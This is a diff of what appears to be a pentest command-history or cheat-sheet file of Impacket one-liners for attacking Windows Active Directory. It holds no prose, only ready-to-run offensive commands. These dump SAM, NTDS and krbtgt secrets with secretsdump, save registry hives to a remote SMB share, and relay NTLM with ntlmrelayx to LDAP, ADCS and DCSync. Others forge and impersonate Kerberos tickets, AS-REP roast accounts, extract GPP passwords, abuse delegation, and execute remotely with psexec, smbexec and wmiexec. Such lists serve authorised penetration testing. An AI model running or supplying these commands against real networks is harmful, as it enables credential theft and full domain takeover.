@@ -3,21 +3,36 @@ reg.py "$DOMAIN"/"$USER":"$PASSWORD"@"$TARGET" save -keyName 'HKLM\SAM' -o '\\19
 reg.py "$DOMAIN"/"$USER":"$PASSWORD"@"$TARGET" save -keyName 'HKLM\SYSTEM' -o '\\192.168.56.1\SHUTDOWN'
 reg.py "$DOMAIN"/"$USER":"$PASSWORD"@"$TARGET" save -keyName 'HKLM\SECURITY' -o '\\192.168.56.1\SHUTDOWN'
 reg.py "$DOMAIN"/"$USER":"$PASSWORD"@"$TARGET" backup -o '\\192.168.56.1\SHUTDOWN'
-secretsdump -sam SAM.save -system SYSTEM.save -security SECURITY.save LOCAL
 smbserver.py -smb2support EXEGOL .
-KRB5CCNAME='DC01.ccache' getST.py -self -impersonate 'domainadmin' -k -no-pass -dc-ip "$DC_HOST" "$DOMAIN"/"$DC_HOST"
+secretsdump -sam SAM.save -system SYSTEM.save -security SECURITY.save LOCAL
+secretsdump -ntds ntds.dit.save -system system.save LOCAL
+secretsdump -hashes :"$NT_HASH" "$DOMAIN"/"$USER"@"$DC_HOST"
+secretsdump -k "$TARGET"
+secretsdump -k -outputfile "$DOMAIN" "$DC_HOST"
+secretsdump -ldapfilter '(&(objectCategory=person)(objectClass=user)(!userAccountControl:1.2.840.113556.1.4.803:=2))' -just-dc -hashes :"$NT_HASH" "$DOMAIN"/"$USER"@"$DC_HOST"
+secretsdump -ldapfilter '(&(objectClass=user)(adminCount=1))' -just-dc -hashes :a88baa3fdc8f581ee0fb05d7054d43e4 "$DOMAIN"/Administrator@"$DC_HOST"
+secretsdump -no-pass "$DOMAIN"/'DC01$'@"$DC_HOST"
+secretsdump -outputfile "$DOMAIN" -just-dc -hashes :"$NT_HASH" "$DOMAIN"/"$USER"@"$DC_HOST"
+secretsdump -just-dc-user krbtgt -hashes :"$NT_HASH" "$DOMAIN"/"$USER"@"$DC_HOST"
 KRB5CCNAME='domainadmin.ccache' secretsdump -just-dc-user 'krbtgt' -dc-ip "$DC_HOST" -k -no-pass @"$DC_HOST"
+KRB5CCNAME='DC01.ccache' getST.py -self -impersonate 'domainadmin' -k -no-pass -dc-ip "$DC_HOST" "$DOMAIN"/"$DC_HOST"
+getST.py -self -impersonate 'domainadmin' -k -no-pass -dc-ip "$DC_HOST" "$DOMAIN"/"$DC_HOST"
+getST.py -spn "host/$TARGET" -impersonate 'domainadmin' -dc-ip "$DC_IP" "$DOMAIN"/'EXEGOL-01$':'exegol4thewin'
+getST.py -spn CIFS/"$TARGET" -impersonate Administrator -dc-ip "$DC_IP" "$DOMAIN"/"$USER":"$PASSWORD"
+getTGT.py -dc-ip "$DC_HOST" "$DOMAIN"/"$USER":"$PASSWORD"
 renameMachine.py -current-name 'testcomputer$' -new-name 'DC01' -dc-ip "$DC_HOST" "$DOMAIN"/"$USER":"$PASSWORD"
-getTGT.py -dc-ip "$DC_HOST" "$DOMAIN"/'DC01':'123pentest'
 renameMachine.py -current-name 'DC01' -new-name 'testcomputer$' -dc-ip "$DC_HOST" "$DOMAIN"/"$USER":"$PASSWORD"
-ntlmrelayx -t "http://pki.$DOMAIN/certsrv/certfnsh.asp" --adcs
-ntlmrelayx -t ldap://"$DC_HOST" -smb2support --remove-mic --shadow-credentials --shadow-target 'dc01$'
+ntlmrelayx -t "https://pki.$DOMAIN/certsrv/certfnsh.asp" -smb2support --adcs --template "KerberosAuthentication"
+ntlmrelayx -t ldaps://"$DC_HOST" -smb2support --remove-mic --shadow-credentials --shadow-target 'dc01$'
 ntlmrelayx -t dcsync://"$DC_HOST" -smb2support
+ntlmrelayx -t "ldaps://$DC_HOST" --http-port 80 --no-dump --no-smb-server --delegate-access --escalate-user 'EXEGOL-01$'
+ntlmrelayx -t ldaps://"$DC_HOST" --http-port 80 --no-dump --no-smb-server --delegate-access --add-computer 'EXEGOL-01' 'exegol4thewin'
+ntlmrelayx -t ldaps://"$DC_HOST" -smb2support --remove-mic --delegate-access --add-computer 'EXEGOL-01' 'exegol4thewin'
+ntlmrelayx -t ldap://"$DC_HOST" -smb2support --interactive
+ntlmrelayx -tf targets.txt -w --ipv6 -smb2support --lootdir ntlmrelayx_lootdir --http-port 3128,80
 Get-GPPPassword -debug -no-pass "$DC_HOST"
 Get-GPPPassword "$DOMAIN"/"$USER":"$PASSWORD"@"$DC_HOST"
 ms14-068.py -u "$USER"@"$DOMAIN" --rc4 "$NT_HASH" -s "$DOMAIN_SID" -d "$DC_HOST"
-getST.py -k -no-pass -spn host/"$DC_HOST" "$DOMAIN"/"$USER"
-secretsdump -ntds ntds.dit.save -system system.save LOCAL
 GetNPUsers.py -request -format hashcat -outputfile ASREProastables.txt -dc-ip "$DC_IP" "$DOMAIN"/
 GetNPUsers.py -request -format hashcat -outputfile ASREProastables.txt -dc-ip "$DC_IP" "$DOMAIN"/"$USER":"$PASSWORD"
 GetNPUsers.py -request -format hashcat -outputfile ASREProastables.txt -hashes :a88baa3fdc8f581ee0fb05d7054d43e4 -dc-ip "$DC_IP" "$DOMAIN"/"$USER"
@@ -36,14 +51,6 @@ ticketer.py -nthash "$NT_HASH" -spn HOST/"$TARGET" -domain-sid "$DOMAIN_SID" -do
 smbclient.py "$DOMAIN"/"$USER":"$PASSWORD"@"$TARGET"
 smbexec.py -hashes :"$NT_HASH" "$DOMAIN"/"$USER"@"$TARGET"
 smbexec.py -share 'ADMIN$' -k "$TARGET"
-secretsdump -hashes :"$NT_HASH" "$DOMAIN"/"$USER"@"$DC_HOST"
-secretsdump -just-dc-user krbtgt -hashes :"$NT_HASH" "$DOMAIN"/"$USER"@"$DC_HOST"
-secretsdump -k "$TARGET"
-secretsdump -k -outputfile "$DOMAIN" "$DC_HOST"
-secretsdump -ldapfilter '(&(objectCategory=person)(objectClass=user)(!userAccountControl:1.2.840.113556.1.4.803:=2))' -just-dc -hashes :"$NT_HASH" "$DOMAIN"/"$USER"@"$DC_HOST"
-secretsdump -ldapfilter '(&(objectClass=user)(adminCount=1))' -just-dc -hashes :a88baa3fdc8f581ee0fb05d7054d43e4 "$DOMAIN"/Administrator@"$DC_HOST"
-secretsdump -no-pass "$DOMAIN"/'DC01$'@"$DC_HOST"
-secretsdump -outputfile "$DOMAIN" -just-dc -hashes :"$NT_HASH" "$DOMAIN"/"$USER"@"$DC_HOST"
 rpcdump.py "$DC_HOST" | grep -A 6 MS-RPRN
 rbcd.py -delegate-from "$USER" -delegate-to 'sv01$' -dc-ip "$DC_IP" -action remove "$DOMAIN"/"$USER":"$PASSWORD"
 rbcd.py -delegate-from "$USER" -delegate-to 'sv01$' -dc-ip "$DC_IP" -action write "$DOMAIN"/"$USER":"$PASSWORD"
@@ -52,17 +59,10 @@ proxychains psexec.py -no-pass "$DOMAIN"/"$USER"@"$TARGET"
 proxychains secretsdump -no-pass "$DOMAIN"/"$USER"@"$TARGET"
 proxychains smbexec.py -no-pass "$DOMAIN"/"$USER"@"$TARGET"
 proxychains wmiexec.py -no-pass "$DOMAIN"/"$USER"@"$TARGET"
-psexec.py -hashes :"$NT_HASH" "$DOMAIN"/"$USER"@"$TARGET"
 proxychains atexec.py -no-pass "$DOMAIN"/"$USER"@"$TARGET"
 proxychains dcomexec.py -no-pass "$DOMAIN"/"$USER"@"$TARGET"
-ntlmrelayx -t ldap://"$DC_HOST" -smb2support --escalate-user 'EXEGOL-01$'
-ntlmrelayx -t ldap://"$DC_HOST" -smb2support --interactive
-ntlmrelayx -t ldaps://"$DC_HOST" -smb2support --add-computer 'EXEGOL-01' 'exegol4thewin' --delegate-access
-ntlmrelayx -t ldaps://"$DC_HOST" -smb2support --remove-mic --add-computer 'EXEGOL-01' 'exegol4thewin' --delegate-access
-ntlmrelayx -tf targets.txt -w --ipv6 -smb2support --lootdir ntlmrelayx_lootdir --http-port 3128,80
 lookupsid.py -hashes :"$NT_HASH" "$DOMAIN"/Administrator@"$DC_HOST" 0
-getST.py -spn "host/$TARGET" -impersonate 'domainadmin' -dc-ip "$DC_IP" "$DOMAIN"/'EXEGOL-01$':'exegol4thewin'
-getST.py -spn CIFS/"$TARGET" -impersonate Administrator -dc-ip "$DC_IP" "$DOMAIN"/"$USER":"$PASSWORD"
+psexec.py -hashes :"$NT_HASH" "$DOMAIN"/"$USER"@"$TARGET"
 dcomexec.py -hashes :"$NT_HASH" "$DOMAIN"/"$USER"@"$TARGET"
 dcomexec.py -hashes :"$NT_HASH" "$DOMAIN"/"$USER"@"$TARGET"
 atexec.py -hashes :"$NT_HASH" "$DOMAIN"/"$USER"@"$TARGET"
